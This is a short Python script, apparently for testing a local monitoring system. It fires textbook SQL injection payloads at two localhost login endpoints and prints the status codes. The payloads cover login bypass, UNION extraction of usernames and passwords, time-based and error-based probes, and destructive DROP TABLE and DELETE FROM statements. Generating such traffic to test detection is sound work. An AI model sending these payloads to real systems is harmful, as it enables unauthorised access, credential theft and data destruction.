import requests
import time
import random

def simulate_sql_injection():
    target_urls = [
        "http://127.0.0.1:5000/login",  # Lokalni monitoring sustav
        "http://127.0.0.1:5001/login"   # Test server
    ]

    sql_payloads = [
        "' OR '1'='1",
        "admin' --",
        "' OR 1=1#",

        "' UNION SELECT username, password FROM users --",
        "' UNION ALL SELECT NULL,NULL,NULL--",

        "'; DROP TABLE users --",
        "'; DELETE FROM users --",

        "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",

        "'; WAITFOR DELAY '0:0:5' --",

        "' AND (SELECT 1/0 FROM users)--"
    ]

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    print("Starting SQL Injection simulation...")

    for target_url in target_urls:
        print(f"\nTesting against: {target_url}")
        for payload in sql_payloads:
            print(f"\nTrying payload: {payload}")

            data = {
                'username': f"admin{payload}",
                'password': 'password123'
            }

            try:
                response = requests.post(target_url, headers=headers, data=data, verify=False)
                print(f"Status Code: {response.status_code}")

            except requests.exceptions.RequestException as e:
                print(f"Error occurred: {e}")

            time.sleep(1)

if __name__ == "__main__":
    simulate_sql_injection()